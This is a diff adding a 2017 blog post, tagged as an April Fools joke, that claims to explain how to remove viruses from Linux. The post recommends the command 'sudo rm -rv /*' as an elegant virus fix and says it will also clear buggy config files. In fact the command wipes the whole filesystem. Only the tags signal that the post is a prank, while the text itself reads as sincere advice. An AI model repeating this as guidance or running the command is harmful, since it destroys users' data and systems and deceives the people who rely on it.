@@ -1,0 +1,20 @@
+---
+layout: post
+title: How to Remove Viruses From Your Linux Installation
+date: '2017-03-23T00:25:00.000-04:00'
+author: umhau
+tags:
+- April Fools
+- Linux
+- what not to do
+- virus
+- dont be an idiot
+- Google will ban me for this
+- unix
+- rm
+modified_time: '2017-03-23T00:25:56.108-04:00'
+blogger_id: tag:blogger.com,1999:blog-2584289275272726799.post-6138197152486080448
+blogger_orig_url: https://www.blogger.com/comment.g?blogID=2584289275272726799&postID=6138197152486080448&isPopup=true
+---
+
+While viruses aren't as big an issue on Linux and Unix as they are on Windows, they can still show up. &nbsp;The Mirai botnet, for instance, ran on IoT devices that used a stripped down version of linux. <br /><br />The following is an elegantly simple command that will work most of the time. &nbsp;(Do note that there are bugs that can get themselves into the firmware of various hardware devices, and this doesn't touch those.)<br /><pre style="background-color: #eff0f1; border: 0px; color: #333333; font-size: 14px; margin-bottom: 1em; overflow: auto; padding: 5px; text-align: justify; width: auto; word-wrap: normal;">sudo rm -rv /*</pre>Get a cup of coffee while it's running, as it will take a while. &nbsp;I've included the verbose command so you can observe its progress. &nbsp;When it's done, any viruses on your system will be completely gone. <br /><br /><b>Note: </b>this command has the added benefit of removing any buggy config files from your system.<br /><br /><br />
